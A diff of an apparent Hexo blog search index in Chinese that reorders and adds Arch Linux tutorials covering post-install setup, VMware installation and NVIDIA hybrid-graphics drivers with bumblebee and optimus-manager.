@@ -102,115 +102,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ArchLinux安装后配置</title>
-    <url>/posts/e4b0c9cf/</url>
-    <content><![CDATA[<h1 id="连接网络"><a href="#连接网络" class="headerlink" title="连接网络"></a>连接网络</h1><p>有线网自动获取IP<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dhcpcd</span><br></pre></td></tr></table></figure></p>
-<p>连接无线网络<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wifi-menu</span><br></pre></td></tr></table></figure><br><a id="more"></a></p>
-<h1 id="创建普通用户"><a href="#创建普通用户" class="headerlink" title="创建普通用户"></a>创建普通用户</h1><p>在linux上root就是上帝，能对系统进行任何操作，包括删除系统文件，所有使用root操作是很危险的，通常都是创建一个普通用户来使用</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -m username</span><br></pre></td></tr></table></figure>
-<p><code>-m</code>:创建用户的家目录<code>/home/username</code><br><code>username</code>:创建的用户名</p>
-<h2 id="给用户设置密码"><a href="#给用户设置密码" class="headerlink" title="给用户设置密码"></a>给用户设置密码</h2><p>root具有上帝权限，所以无需验证任何用户的密码就能修改用户的密码，新建的用户还没有密码所以还无法登录(但root通过<code>su</code>命令能无密码登录)，所以需要给用户设置密码后用户才能登录</p>
-<p>给<code>username</code>设置密码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd username</span><br></pre></td></tr></table></figure><br>连续输入两次密码回车即可（linux不显示密码的输入）</p>
-<h1 id="配置sudo"><a href="#配置sudo" class="headerlink" title="配置sudo"></a>配置sudo</h1><p>创建了普通用户，但很多情况下需要用到root的权限怎么办呢?这就需要用到<code>sudo</code>来提权了</p>
-<p>sudo 能临时赋予用户root的部分管理权限，达到使用root运行相关指令的目的,比如arch的包管理器<code>pacman</code>就需要root权限,也就是说安装软件就需要root权限</p>
-<h2 id="安装sudo软件包"><a href="#安装sudo软件包" class="headerlink" title="安装sudo软件包:"></a>安装sudo软件包:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S sudo</span><br></pre></td></tr></table></figure>
-<p>若安装基础包时安装了<code>base-devel</code>包就无需安装了,<code>base-devel</code>软件包含有<code>sudo</code></p>
-<p><strong>配置sudo</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /sudoers</span><br></pre></td></tr></table></figure></p>
-<p>打开配置文件后找到<code>%wheel ALL=(ALL)ALL</code>，去掉注释<code>#</code>，重启<code>reboot</code>，给整个用户组权限</p>
-<p>也可直接添加一条<code>username ALL=(ALL)ALL</code>给用户权限</p>
-<h2 id="加入wheel用户组"><a href="#加入wheel用户组" class="headerlink" title="加入wheel用户组"></a>加入wheel用户组</h2><p>将用户加入whell用户组<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usermod -G wheel username</span><br></pre></td></tr></table></figure></p>
-<p>wheel 组的概念继承自 UNIX，当需要进行一些高级维护时，往往要用到 root 权限；而wheel 组是一个包含特殊权限的用户组，用来满足需要 root 权限的需求。</p>
-<p>对于服务器来说，我们希望只有属于 wheel 组的用户才可以用 <code>su</code> 登录 root。这样就进一步增强了系统的安全性。具体步骤如下：</p>
-<ul>
-<li><p>修改 <code>/etc/pam.d/su</code> 文件，找到<code>#auth required /lib/security/$ISA/pam_wheel.so use_uid</code>，将行首的注释<code>#</code>去掉。</p>
-</li>
-<li><p>修改 <code>/etc/login.defs</code> 文件，在最后一行增加：<code>SU_WHEEL_ONLY yes</code>。</p>
-</li>
-</ul>
-<p>然后，用<code>usermod -G wheel username</code> 将用户添加到 wheel 组中,这样被添加到 wheel 组的用户登录，就能执行 <code>su</code> 命令输入正确的 root 密码就可以正常的登录为 root 用户了。</p>
-<h1 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h1><h2 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a>显卡驱动</h2><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>品牌</th>
-<th>驱动</th>
-<th>驱动类型</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>AMD/ATI</td>
-<td><code>xf86-video-amdgpu</code>、<code>xf86-video-ati</code></td>
-<td>开源</td>
-</tr>
-<tr>
-<td></td>
-<td><code>catalyst</code>(AUR)</td>
-<td>闭源</td>
-</tr>
-<tr>
-<td>Intel</td>
-<td><code>xf86-video-intel</code></td>
-<td>开源</td>
-</tr>
-<tr>
-<td>Nvidia</td>
-<td><code>xf86-video-nonveau</code></td>
-<td>开源</td>
-</tr>
-<tr>
-<td></td>
-<td><code>nvidia</code>、<code>nvidia-340xx</code>、<code>nvidia-304xx</code></td>
-<td>闭源</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p>参照表格安装相应的驱动，通常安装集显的开源驱动就够用，若需要打点游戏，做点图什么的可以安装独立显卡的闭源驱动提升性能。<font color="ff0000"><strong>安装闭源驱动一定要查看wiki根据说明安装，不然可能回无法正常进入系统</strong></font></p>
-<p>查看被识别的显卡:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lspci | grep -e VGA -e 3D</span><br></pre></td></tr></table></figure></p>
-<p>搜索开源驱动:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Ss xf86-video</span><br></pre></td></tr></table></figure></p>
-<p>安装intel集显开源驱动:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S xf86-video-intel</span><br></pre></td></tr></table></figure></p>
-<h2 id="安装Xorg"><a href="#安装Xorg" class="headerlink" title="安装Xorg"></a>安装Xorg</h2><p>Xorg是Linux下的一个著名的开源图形服务</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S xorg</span><br></pre></td></tr></table></figure>
-<h2 id="安装桌面"><a href="#安装桌面" class="headerlink" title="安装桌面"></a>安装桌面</h2><p>Linux下有很多著名的<a href="https://wiki.archlinux.org/index.php/Desktop_environment#List_of_desktop_environments">桌面环境</a>如：</p>
-<ul>
-<li>Xfce</li>
-<li>KDE(Plasma)</li>
-<li>Gnome</li>
-<li>Unity</li>
-<li>Deepin(深度的国产桌面环境)</li>
-</ul>
-<p>自行选择安装即可</p>
-<p>如:</p>
-<ul>
-<li>Xfce :<code>sudo pacman -S xfce4 xfce4-goodies</code></li>
-<li>KDE(Plasma):<code>sudo pacman -S plasma kde-application</code></li>
-<li>Gnome:<code>sudo pacman -S gnome gnome-extra</code></li>
-<li>Deepin:<code>sudo pacman -S deepin deepin-extra</code></li>
-</ul>
-<h2 id="安装桌面管理器"><a href="#安装桌面管理器" class="headerlink" title="安装桌面管理器"></a>安装桌面管理器</h2><p>安装好了桌面环境包以后，需要安装一个<a href="https://wiki.archlinux.org/index.php/Display_manager">桌面管理器</a>来帮助我们登录且选择使用的桌面环境</p>
-<ul>
-<li>LightDM : <code>sudo pacman -S lighdm</code></li>
-<li>sddm : <code>sudo pacman -S sddm</code></li>
-<li>GDM : <code>sudo pacman -S gdm</code></li>
-</ul>
-<p><strong>启动桌面管理器服务</strong></p>
-<p>服务管理<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开机启动/关闭开启启动</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> xxxx</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动/停止服务</span></span><br><span class="line">sudo systemctl start xxxx</span><br><span class="line">sudo systemctl stop xxxx</span><br></pre></td></tr></table></figure></p>
-<p>如设置开机启动<code>sddm</code>: <code>sudo systemctl enable sddm</code></p>
-<h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1><p>之前用的一直是netctl这个自带的网络服务，而桌面环境使用的是NetworkManager这个网络服务，所以需要禁用netctl并启用NetworkManager</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">disable</span> netctl</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> NetworkManager</span><br></pre></td></tr></table></figure>
-<p>安装工具栏图标显示网络<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S network-manager-applet</span><br></pre></td></tr></table></figure></p>
-<p><strong>重启电脑即可</strong></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Arch</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ArchLinux安装教程</title>
     <url>/posts/a5e4683b/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  Arch Linux是当下最热门的Linux发行版之一，它提供简单、最小化且优雅的体验，Arch可通过自己的喜好定制属于自己的系统，这就带来了一个难题一切都得通过命令行手动定制(包括安装系统)，这对于初学Linux的人来说是不利的，所以不建议初学者安装Arch。<br><a id="more"></a><br>  Arch 优点：</p>
@@ -590,25 +481,105 @@
       </tags>
   </entry>
   <entry>
-    <title>ArchLinux系安装VMware</title>
-    <url>/posts/331864ab/</url>
-    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="从aur库安装"><a href="#从aur库安装" class="headerlink" title="从aur库安装"></a>从aur库安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay vmware-workstation</span><br></pre></td></tr></table></figure>
-<p>首次启动使用root权限启动激活</p>
-<h2 id="下载的安装包安装"><a href="#下载的安装包安装" class="headerlink" title="下载的安装包安装"></a>下载的安装包安装</h2><p>下载最新的安装包</p>
-<p>安装 依赖项:<br>    fuse2 - 提供 vmware-vmblock-fuse<br>    gksu（AUR） - 支持需要 root 权限的操作（比如内存分配、注册许可证等等）<br>    gtkmm - 支持 GUI<br>    linux-headers - 模块编译所需<br>    ncurses5-compat-libsAUR - 支持安装程序的 —console 选项<br>    libcanberra - 支持事件提示音</p>
-<p><a href="https://www.vmware.com/go/tryworkstation">VMware Workstation Pro</a><br><a href="https://www.vmware.com/go/downloadplayer">Player</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./VMware-edition-version.release.architecture.bundle</span><br><span class="line"></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><strong>当安装程序询问 <code>System service scripts directory</code> 的设置时，输入 <code>/etc/init.d</code> 即可</strong><br>安装过程中会收到”No rc*.d style init script directories”错误。这可以安全忽略，因为Arch使用的是systemd.</p>
-<p>一些选项：</p>
+    <title>ArchLinux安装后配置</title>
+    <url>/posts/e4b0c9cf/</url>
+    <content><![CDATA[<h1 id="连接网络"><a href="#连接网络" class="headerlink" title="连接网络"></a>连接网络</h1><p>有线网自动获取IP<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dhcpcd</span><br></pre></td></tr></table></figure></p>
+<p>连接无线网络<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wifi-menu</span><br></pre></td></tr></table></figure><br><a id="more"></a></p>
+<h1 id="创建普通用户"><a href="#创建普通用户" class="headerlink" title="创建普通用户"></a>创建普通用户</h1><p>在linux上root就是上帝，能对系统进行任何操作，包括删除系统文件，所有使用root操作是很危险的，通常都是创建一个普通用户来使用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -m username</span><br></pre></td></tr></table></figure>
+<p><code>-m</code>:创建用户的家目录<code>/home/username</code><br><code>username</code>:创建的用户名</p>
+<h2 id="给用户设置密码"><a href="#给用户设置密码" class="headerlink" title="给用户设置密码"></a>给用户设置密码</h2><p>root具有上帝权限，所以无需验证任何用户的密码就能修改用户的密码，新建的用户还没有密码所以还无法登录(但root通过<code>su</code>命令能无密码登录)，所以需要给用户设置密码后用户才能登录</p>
+<p>给<code>username</code>设置密码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd username</span><br></pre></td></tr></table></figure><br>连续输入两次密码回车即可（linux不显示密码的输入）</p>
+<h1 id="配置sudo"><a href="#配置sudo" class="headerlink" title="配置sudo"></a>配置sudo</h1><p>创建了普通用户，但很多情况下需要用到root的权限怎么办呢?这就需要用到<code>sudo</code>来提权了</p>
+<p>sudo 能临时赋予用户root的部分管理权限，达到使用root运行相关指令的目的,比如arch的包管理器<code>pacman</code>就需要root权限,也就是说安装软件就需要root权限</p>
+<h2 id="安装sudo软件包"><a href="#安装sudo软件包" class="headerlink" title="安装sudo软件包:"></a>安装sudo软件包:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S sudo</span><br></pre></td></tr></table></figure>
+<p>若安装基础包时安装了<code>base-devel</code>包就无需安装了,<code>base-devel</code>软件包含有<code>sudo</code></p>
+<p><strong>配置sudo</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /sudoers</span><br></pre></td></tr></table></figure></p>
+<p>打开配置文件后找到<code>%wheel ALL=(ALL)ALL</code>，去掉注释<code>#</code>，重启<code>reboot</code>，给整个用户组权限</p>
+<p>也可直接添加一条<code>username ALL=(ALL)ALL</code>给用户权限</p>
+<h2 id="加入wheel用户组"><a href="#加入wheel用户组" class="headerlink" title="加入wheel用户组"></a>加入wheel用户组</h2><p>将用户加入whell用户组<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usermod -G wheel username</span><br></pre></td></tr></table></figure></p>
+<p>wheel 组的概念继承自 UNIX，当需要进行一些高级维护时，往往要用到 root 权限；而wheel 组是一个包含特殊权限的用户组，用来满足需要 root 权限的需求。</p>
+<p>对于服务器来说，我们希望只有属于 wheel 组的用户才可以用 <code>su</code> 登录 root。这样就进一步增强了系统的安全性。具体步骤如下：</p>
 <ul>
-<li><code>--eulas-agreed</code> : 跳过各种许可协议</li>
-<li><code>--console</code> : 使用命令行界面，而非 GUI</li>
-<li><code>--custom</code> : 允许自定义安装目录，比如/usr/local（记得修改#Systemd 服务一节下，vmware-usbarbitrator.service中的路径）</li>
-<li><code>-I</code>, <code>--ignore-errors</code> : 忽略致命错误</li>
-<li><code>--set-setting=vmware-workstation serialNumber XXXXX-XXXXX-XXXXX-XXXXX-XXXXX</code> : 设置安装时使用的序列号（有利于脚本化安装）</li>
-<li><code>--required</code> : 只询问必要的问题（当结合<code>--eulas-agreed</code>和<code>--console</code>时可以实现静默安装）</li>
+<li><p>修改 <code>/etc/pam.d/su</code> 文件，找到<code>#auth required /lib/security/$ISA/pam_wheel.so use_uid</code>，将行首的注释<code>#</code>去掉。</p>
+</li>
+<li><p>修改 <code>/etc/login.defs</code> 文件，在最后一行增加：<code>SU_WHEEL_ONLY yes</code>。</p>
+</li>
 </ul>
-<h1 id="添加Systemd服务-可选"><a href="#添加Systemd服务-可选" class="headerlink" title="添加Systemd服务(可选)"></a>添加Systemd服务(可选)</h1><p>安装服务包,之后就能使用enable了</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay vmware-systemd-services</span><br></pre></td></tr></table></figure>
-<p>参考:<a href="https://wiki.archlinux.org/index.php/VMware">VMware Wiki</a></p>
+<p>然后，用<code>usermod -G wheel username</code> 将用户添加到 wheel 组中,这样被添加到 wheel 组的用户登录，就能执行 <code>su</code> 命令输入正确的 root 密码就可以正常的登录为 root 用户了。</p>
+<h1 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h1><h2 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a>显卡驱动</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>品牌</th>
+<th>驱动</th>
+<th>驱动类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AMD/ATI</td>
+<td><code>xf86-video-amdgpu</code>、<code>xf86-video-ati</code></td>
+<td>开源</td>
+</tr>
+<tr>
+<td></td>
+<td><code>catalyst</code>(AUR)</td>
+<td>闭源</td>
+</tr>
+<tr>
+<td>Intel</td>
+<td><code>xf86-video-intel</code></td>
+<td>开源</td>
+</tr>
+<tr>
+<td>Nvidia</td>
+<td><code>xf86-video-nonveau</code></td>
+<td>开源</td>
+</tr>
+<tr>
+<td></td>
+<td><code>nvidia</code>、<code>nvidia-340xx</code>、<code>nvidia-304xx</code></td>
+<td>闭源</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>参照表格安装相应的驱动，通常安装集显的开源驱动就够用，若需要打点游戏，做点图什么的可以安装独立显卡的闭源驱动提升性能。<font color="ff0000"><strong>安装闭源驱动一定要查看wiki根据说明安装，不然可能回无法正常进入系统</strong></font></p>
+<p>查看被识别的显卡:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lspci | grep -e VGA -e 3D</span><br></pre></td></tr></table></figure></p>
+<p>搜索开源驱动:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Ss xf86-video</span><br></pre></td></tr></table></figure></p>
+<p>安装intel集显开源驱动:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S xf86-video-intel</span><br></pre></td></tr></table></figure></p>
+<h2 id="安装Xorg"><a href="#安装Xorg" class="headerlink" title="安装Xorg"></a>安装Xorg</h2><p>Xorg是Linux下的一个著名的开源图形服务</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S xorg</span><br></pre></td></tr></table></figure>
+<h2 id="安装桌面"><a href="#安装桌面" class="headerlink" title="安装桌面"></a>安装桌面</h2><p>Linux下有很多著名的<a href="https://wiki.archlinux.org/index.php/Desktop_environment#List_of_desktop_environments">桌面环境</a>如：</p>
+<ul>
+<li>Xfce</li>
+<li>KDE(Plasma)</li>
+<li>Gnome</li>
+<li>Unity</li>
+<li>Deepin(深度的国产桌面环境)</li>
+</ul>
+<p>自行选择安装即可</p>
+<p>如:</p>
+<ul>
+<li>Xfce :<code>sudo pacman -S xfce4 xfce4-goodies</code></li>
+<li>KDE(Plasma):<code>sudo pacman -S plasma kde-application</code></li>
+<li>Gnome:<code>sudo pacman -S gnome gnome-extra</code></li>
+<li>Deepin:<code>sudo pacman -S deepin deepin-extra</code></li>
+</ul>
+<h2 id="安装桌面管理器"><a href="#安装桌面管理器" class="headerlink" title="安装桌面管理器"></a>安装桌面管理器</h2><p>安装好了桌面环境包以后，需要安装一个<a href="https://wiki.archlinux.org/index.php/Display_manager">桌面管理器</a>来帮助我们登录且选择使用的桌面环境</p>
+<ul>
+<li>LightDM : <code>sudo pacman -S lighdm</code></li>
+<li>sddm : <code>sudo pacman -S sddm</code></li>
+<li>GDM : <code>sudo pacman -S gdm</code></li>
+</ul>
+<p><strong>启动桌面管理器服务</strong></p>
+<p>服务管理<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开机启动/关闭开启启动</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> xxxx</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动/停止服务</span></span><br><span class="line">sudo systemctl start xxxx</span><br><span class="line">sudo systemctl stop xxxx</span><br></pre></td></tr></table></figure></p>
+<p>如设置开机启动<code>sddm</code>: <code>sudo systemctl enable sddm</code></p>
+<h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1><p>之前用的一直是netctl这个自带的网络服务，而桌面环境使用的是NetworkManager这个网络服务，所以需要禁用netctl并启用NetworkManager</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">disable</span> netctl</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> NetworkManager</span><br></pre></td></tr></table></figure>
+<p>安装工具栏图标显示网络<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S network-manager-applet</span><br></pre></td></tr></table></figure></p>
+<p><strong>重启电脑即可</strong></p>
 ]]></content>
       <categories>
         <category>Linux</category>
@@ -616,7 +587,6 @@
       <tags>
         <tag>Arch</tag>
         <tag>Linux</tag>
-        <tag>VMware</tag>
       </tags>
   </entry>
   <entry>
@@ -660,6 +630,36 @@
       <tags>
         <tag>Arch</tag>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ArchLinux系安装VMware</title>
+    <url>/posts/331864ab/</url>
+    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="从aur库安装"><a href="#从aur库安装" class="headerlink" title="从aur库安装"></a>从aur库安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay vmware-workstation</span><br></pre></td></tr></table></figure>
+<p>首次启动使用root权限启动激活</p>
+<h2 id="下载的安装包安装"><a href="#下载的安装包安装" class="headerlink" title="下载的安装包安装"></a>下载的安装包安装</h2><p>下载最新的安装包</p>
+<p>安装 依赖项:<br>    fuse2 - 提供 vmware-vmblock-fuse<br>    gksu（AUR） - 支持需要 root 权限的操作（比如内存分配、注册许可证等等）<br>    gtkmm - 支持 GUI<br>    linux-headers - 模块编译所需<br>    ncurses5-compat-libsAUR - 支持安装程序的 —console 选项<br>    libcanberra - 支持事件提示音</p>
+<p><a href="https://www.vmware.com/go/tryworkstation">VMware Workstation Pro</a><br><a href="https://www.vmware.com/go/downloadplayer">Player</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./VMware-edition-version.release.architecture.bundle</span><br><span class="line"></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><strong>当安装程序询问 <code>System service scripts directory</code> 的设置时，输入 <code>/etc/init.d</code> 即可</strong><br>安装过程中会收到”No rc*.d style init script directories”错误。这可以安全忽略，因为Arch使用的是systemd.</p>
+<p>一些选项：</p>
+<ul>
+<li><code>--eulas-agreed</code> : 跳过各种许可协议</li>
+<li><code>--console</code> : 使用命令行界面，而非 GUI</li>
+<li><code>--custom</code> : 允许自定义安装目录，比如/usr/local（记得修改#Systemd 服务一节下，vmware-usbarbitrator.service中的路径）</li>
+<li><code>-I</code>, <code>--ignore-errors</code> : 忽略致命错误</li>
+<li><code>--set-setting=vmware-workstation serialNumber XXXXX-XXXXX-XXXXX-XXXXX-XXXXX</code> : 设置安装时使用的序列号（有利于脚本化安装）</li>
+<li><code>--required</code> : 只询问必要的问题（当结合<code>--eulas-agreed</code>和<code>--console</code>时可以实现静默安装）</li>
+</ul>
+<h1 id="添加Systemd服务-可选"><a href="#添加Systemd服务-可选" class="headerlink" title="添加Systemd服务(可选)"></a>添加Systemd服务(可选)</h1><p>安装服务包,之后就能使用enable了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay vmware-systemd-services</span><br></pre></td></tr></table></figure>
+<p>参考:<a href="https://wiki.archlinux.org/index.php/VMware">VMware Wiki</a></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Arch</tag>
+        <tag>Linux</tag>
+        <tag>VMware</tag>
       </tags>
   </entry>
   <entry>
@@ -824,6 +824,50 @@
       </tags>
   </entry>
   <entry>
+    <title>Arch独立显卡驱动安装</title>
+    <url>/posts/4578a678/</url>
+    <content><![CDATA[<p>  Linux到独立显卡分开源驱动和闭源驱动两种，开源驱动不能完全发挥独立显卡到性能，闭源驱动使用<code>bumblebee</code> 的 <code>optirun</code> 的兼容性不好。而 <code>optimus-manager</code> 可以设置开机默认使用 Intel 还是 Nvidia ，可以随时在这两者之间切换。</p>
+<a id="more"></a>
+<h1 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus</span><br></pre></td></tr></table></figure>
+<h1 id="安装闭源bumblebee版驱动"><a href="#安装闭源bumblebee版驱动" class="headerlink" title="安装闭源bumblebee版驱动"></a>安装闭源bumblebee版驱动</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo mhwd -f -i pci video-hybrid-intel-nvidia-bumblebee</span><br><span class="line"><span class="comment"># sudo mhwd -f -i pci video-hybrid-intel-nvidia-390xx-bumblebee</span></span><br></pre></td></tr></table></figure>
+<h2 id="讲用户加入到bumblee组"><a href="#讲用户加入到bumblee组" class="headerlink" title="讲用户加入到bumblee组"></a>讲用户加入到bumblee组</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo gpasswd -a <span class="variable">$USER</span> bumblebee</span><br></pre></td></tr></table></figure>
+<h2 id="设置bumblebeed开机自启"><a href="#设置bumblebeed开机自启" class="headerlink" title="设置bumblebeed开机自启"></a>设置bumblebeed开机自启</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> bumblebeed</span><br></pre></td></tr></table></figure>
+<p><strong>很多硬件厂商的BIOS驱动对Linux不友好，无法顺利加载ACPI模块，从而导致无法驱动独立显卡，这就需要修改grub启动文件使ACPI模块能正常工作</strong></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/default/grub</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet acpi_osi=! resume=UUID=2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot; 中加入 acpi_osi=’Windows 2009’ 或者 acpi_osi=! acpi_osi=Linux acpi_osi=’Windows 2015’ pcie_port_pm=off</span></span><br><span class="line"><span class="comment"># acpi_osi=’Windows 2009’的意思是告诉ACPI模块，我是‘Windows 7’，模拟Windows让其继续运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如：</span></span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=<span class="string">&quot;quiet acpi_osi=! acpi_osi=’Windows 2009’ resume=UUID=2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="更新grub文件，使永久有效"><a href="#更新grub文件，使永久有效" class="headerlink" title="更新grub文件，使永久有效"></a>更新grub文件，使永久有效</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo update-grub</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
+<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装性能测试软件</span></span><br><span class="line">sudo pacman -S mesa-demos</span><br><span class="line">sudo pacman -S glmark2</span><br></pre></td></tr></table></figure>
+<h1 id="测试集显性能"><a href="#测试集显性能" class="headerlink" title="测试集显性能"></a>测试集显性能</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">glxgears</span><br><span class="line">glmark2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试独显性能</span></span><br><span class="line">optirun glxgears</span><br><span class="line">optirun glmark2</span><br></pre></td></tr></table></figure>
+<h2 id="NVIDIA-setting面板打不开使用以下命令"><a href="#NVIDIA-setting面板打不开使用以下命令" class="headerlink" title="NVIDIA setting面板打不开使用以下命令"></a>NVIDIA setting面板打不开使用以下命令</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">optirun -b none nvidia-settings -c :8</span><br></pre></td></tr></table></figure>
+<h1 id="使用optimus-manager管理显卡"><a href="#使用optimus-manager管理显卡" class="headerlink" title="使用optimus-manager管理显卡"></a>使用optimus-manager管理显卡</h1><p><a href="https://github.com/Askannz/optimus-manager">optimus-manager仓库</a></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo pacman -S optimus-manager</span><br></pre></td></tr></table></figure>
+<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>确保 <code>/etc/X11/xorg.conf</code> 和 <code>/etc/X11/xorg.conf.d</code> 下没有其他显卡和显示相关的配置，如果有的话可以备份后删掉,原因是 <code>optimus-manager</code> 会生成显卡配置文件 <code>/etc/X11/xorg.conf.d/10-optimus-manager.conf</code>,多个显卡配置文件可能导致出错</p>
+<p><strong>目录结构如下</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tree &#x2F;etc&#x2F;X11&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;X11&#x2F;</span><br><span class="line">├── xinit</span><br><span class="line">│   └── xinitrc.d</span><br><span class="line">│       ├── 40-libcanberra-gtk-module.sh</span><br><span class="line">│       └── 50-systemd-user.sh</span><br><span class="line">└── xorg.conf.d</span><br><span class="line">        └── 10-optimus-manager.conf</span><br></pre></td></tr></table></figure>
+<h2 id="关闭-bumblebeed"><a href="#关闭-bumblebeed" class="headerlink" title="关闭 bumblebeed"></a>关闭 bumblebeed</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl stop bumblebeed</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> bumblebeed</span><br></pre></td></tr></table></figure>
+<h1 id="启动optimus-manager服务"><a href="#启动optimus-manager服务" class="headerlink" title="启动optimus-manager服务"></a>启动optimus-manager服务</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> optimus-manager</span><br></pre></td></tr></table></figure>
+<p><strong>重启</strong></p>
+<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 切换到nvidia</span><br><span class="line">optimus-manager --switch nvidia</span><br><span class="line"></span><br><span class="line"># 切换到Intel</span><br><span class="line">optimus-manager --switch intel</span><br><span class="line"></span><br><span class="line"># 设置开机使用intel</span><br><span class="line">optimus-manager --set-startup&#x3D;intel</span><br></pre></td></tr></table></figure>
